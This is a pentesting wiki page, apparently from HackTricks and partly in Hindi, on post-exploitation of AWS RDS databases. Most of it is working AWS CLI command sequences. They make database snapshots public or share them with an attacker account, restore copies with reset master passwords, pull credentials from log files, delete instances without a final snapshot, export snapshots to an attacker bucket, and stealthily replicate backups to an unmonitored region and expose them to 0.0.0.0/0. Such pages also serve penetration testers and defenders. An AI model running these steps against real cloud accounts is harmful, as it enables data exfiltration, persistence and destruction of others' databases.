# AWS - RDS Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## RDS

अधिक जानकारी के लिए देखें:

{{#ref}}
../aws-services/aws-relational-database-rds-enum.md
{{#endref}}

### `rds:CreateDBSnapshot`, `rds:RestoreDBInstanceFromDBSnapshot`, `rds:ModifyDBInstance`

If the attacker has enough permissions, he could make a **DB सार्वजनिक रूप से सुलभ** by creating a snapshot of the DB, and then a publicly accessible DB from the snapshot.
```bash
aws rds describe-db-instances # Get DB identifier

aws rds create-db-snapshot \
--db-instance-identifier <db-id> \
--db-snapshot-identifier cloudgoat

# Get subnet groups & security groups
aws rds describe-db-subnet-groups
aws ec2 describe-security-groups

aws rds restore-db-instance-from-db-snapshot \
--db-instance-identifier "new-db-not-malicious" \
--db-snapshot-identifier <scapshotId> \
--db-subnet-group-name <db subnet group> \
--publicly-accessible \
--vpc-security-group-ids <ec2-security group>

aws rds modify-db-instance \
--db-instance-identifier "new-db-not-malicious" \
--master-user-password 'Llaody2f6.123' \
--apply-immediately

# Connect to the new DB after a few mins
```
### `rds:ModifyDBSnapshotAttribute`, `rds:CreateDBSnapshot`

एक हमलावर के पास ये permissions होने पर वह एक DB का **snapshot** बना सकता है और उसे **publicly** **available** कर सकता है। फिर वह अपने ही account में उस snapshot से एक DB बना सकता है।

यदि हमलावर के पास `rds:CreateDBSnapshot` नहीं है, तब भी वह अन्य बनाए गए snapshots को **public** कर सकता है।
```bash
# create snapshot
aws rds create-db-snapshot --db-instance-identifier <db-instance-identifier> --db-snapshot-identifier <snapshot-name>

# Make it public/share with attackers account
aws rds modify-db-snapshot-attribute --db-snapshot-identifier <snapshot-name> --attribute-name restore --values-to-add all
## Specify account IDs instead of "all" to give access only to a specific account: --values-to-add {"111122223333","444455556666"}
```
### `rds:DownloadDBLogFilePortion`

जिसके पास `rds:DownloadDBLogFilePortion` अनुमति है, वह किसी RDS instance की लॉग फ़ाइलों के हिस्से **डाउनलोड** कर सकता है। यदि संवेदनशील डेटा या access credentials गलती से लॉग हो गए हों, तो हमलावर इन जानकारियों का उपयोग करके अपने अधिकार बढ़ा सकता है या अनधिकृत क्रियाएँ कर सकता है।
```bash
aws rds download-db-log-file-portion --db-instance-identifier target-instance --log-file-name error/mysql-error-running.log --starting-token 0 --output text
```
**संभावित प्रभाव**: leaked credentials का उपयोग करके संवेदनशील जानकारी तक पहुँच या अनधिकृत कार्रवाइयाँ।

### `rds:DeleteDBInstance`

इन अनुमतियों वाले हमलावर **DoS existing RDS instances** कर सकते हैं।
```bash
# Delete
aws rds delete-db-instance --db-instance-identifier target-instance --skip-final-snapshot
```
**Potential impact**: मौजूदा RDS instances का हटना, और संभावित डेटा हानि।

### `rds:StartExportTask`

> [!NOTE]
> TODO: परीक्षण

यह अनुमति रखने वाला एक हमलावर **export an RDS instance snapshot to an S3 bucket** कर सकता है। यदि हमलावर के पास गंतव्य S3 bucket पर नियंत्रण है, तो वे निर्यातित RDS instance snapshot के भीतर संवेदनशील डेटा तक संभावित रूप से पहुँच सकते हैं।
```bash
aws rds start-export-task --export-task-identifier attacker-export-task --source-arn arn:aws:rds:region:account-id:snapshot:target-snapshot --s3-bucket-name attacker-bucket --iam-role-arn arn:aws:iam::account-id:role/export-role --kms-key-id arn:aws:kms:region:account-id:key/key-id
```
**Potential impact**: एक्सपोर्ट किए गए snapshot में संवेदनशील डेटा तक पहुँच।

### Cross-Region Automated Backups Replication for Stealthy Restore (`rds:StartDBInstanceAutomatedBackupsReplication`)

क्रॉस-रीजन ऑटोमेटेड बैकअप्स रिप्लिकेशन का दुरुपयोग करके चुपके से किसी RDS instance के automated backups को दूसरी AWS Region में डुप्लिकेट करें और वहां restore करें। attacker फिर restored DB को सार्वजनिक रूप से उपलब्ध बना सकता है और master password रिसेट करके डेटा को उस Region से बाहर एक्सेस कर सकता है जिस Region की defenders निगरानी नहीं कर रहे होंगे।

Permissions needed (minimum):
- `rds:StartDBInstanceAutomatedBackupsReplication` in the destination Region
- `rds:DescribeDBInstanceAutomatedBackups` in the destination Region
- `rds:RestoreDBInstanceToPointInTime` in the destination Region
- `rds:ModifyDBInstance` in the destination Region
- `rds:StopDBInstanceAutomatedBackupsReplication` (optional cleanup)
- `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress` (रिस्टोर की गई DB को एक्सपोज़ करने के लिए)

Impact: प्रोडक्शन डेटा की एक कॉपी को दूसरी Region में restore करके और attacker-नियंत्रित क्रेडेंशियल्स के साथ उसे सार्वजनिक रूप से एक्सपोज़ करके persistence और डेटा exfiltration।

<details>
<summary>End-to-end CLI (replace placeholders)</summary>
```bash
# 1) Recon (SOURCE region A)
aws rds describe-db-instances \
--region <SOURCE_REGION> \
--query 'DBInstances[*].[DBInstanceIdentifier,DBInstanceArn,Engine,DBInstanceStatus,PreferredBackupWindow]' \
--output table

# 2) Start cross-Region automated backups replication (run in DEST region B)
aws rds start-db-instance-automated-backups-replication \
--region <DEST_REGION> \
--source-db-instance-arn <SOURCE_DB_INSTANCE_ARN> \
--source-region <SOURCE_REGION> \
--backup-retention-period 7

# 3) Wait for replication to be ready in DEST
aws rds describe-db-instance-automated-backups \
--region <DEST_REGION> \
--query 'DBInstanceAutomatedBackups[*].[DBInstanceAutomatedBackupsArn,DBInstanceIdentifier,Status]' \
--output table
# Proceed when Status is "replicating" or "active" and note the DBInstanceAutomatedBackupsArn

# 4) Restore to latest restorable time in DEST
aws rds restore-db-instance-to-point-in-time \
--region <DEST_REGION> \
--source-db-instance-automated-backups-arn <AUTO_BACKUP_ARN> \
--target-db-instance-identifier <TARGET_DB_ID> \
--use-latest-restorable-time \
--db-instance-class db.t3.micro
aws rds wait db-instance-available --region <DEST_REGION> --db-instance-identifier <TARGET_DB_ID>

# 5) Make public and reset credentials in DEST
# 5a) Create/choose an open SG permitting TCP/3306 (adjust engine/port as needed)
OPEN_SG_ID=$(aws ec2 create-security-group --region <DEST_REGION> \
--group-name open-rds-<RAND> --description open --vpc-id <DEST_VPC_ID> \
--query GroupId --output text)
aws ec2 authorize-security-group-ingress --region <DEST_REGION> \
--group-id "$OPEN_SG_ID" \
--ip-permissions IpProtocol=tcp,FromPort=3306,ToPort=3306,IpRanges='[{CidrIp=0.0.0.0/0}]'

# 5b) Publicly expose restored DB and attach the SG
aws rds modify-db-instance --region <DEST_REGION> \
--db-instance-identifier <TARGET_DB_ID> \
--publicly-accessible \
--vpc-security-group-ids "$OPEN_SG_ID" \
--apply-immediately
aws rds wait db-instance-available --region <DEST_REGION> --db-instance-identifier <TARGET_DB_ID>

# 5c) Reset the master password
aws rds modify-db-instance --region <DEST_REGION> \
--db-instance-identifier <TARGET_DB_ID> \
--master-user-password '<NEW_STRONG_PASSWORD>' \
--apply-immediately
aws rds wait db-instance-available --region <DEST_REGION> --db-instance-identifier <TARGET_DB_ID>

# 6) Connect to <TARGET_DB_ID> endpoint and validate data (example for MySQL)
ENDPOINT=$(aws rds describe-db-instances --region <DEST_REGION> \
--db-instance-identifier <TARGET_DB_ID> \
--query 'DBInstances[0].Endpoint.Address' --output text)
mysql -h "$ENDPOINT" -u <MASTER_USERNAME> -p'<NEW_STRONG_PASSWORD>' -e 'SHOW DATABASES;'

# 7) Optional: stop replication
aws rds stop-db-instance-automated-backups-replication \
--region <DEST_REGION> \
--source-db-instance-arn <SOURCE_DB_INSTANCE_ARN>
```
</details>


{{#include ../../../banners/hacktricks-training.md}}
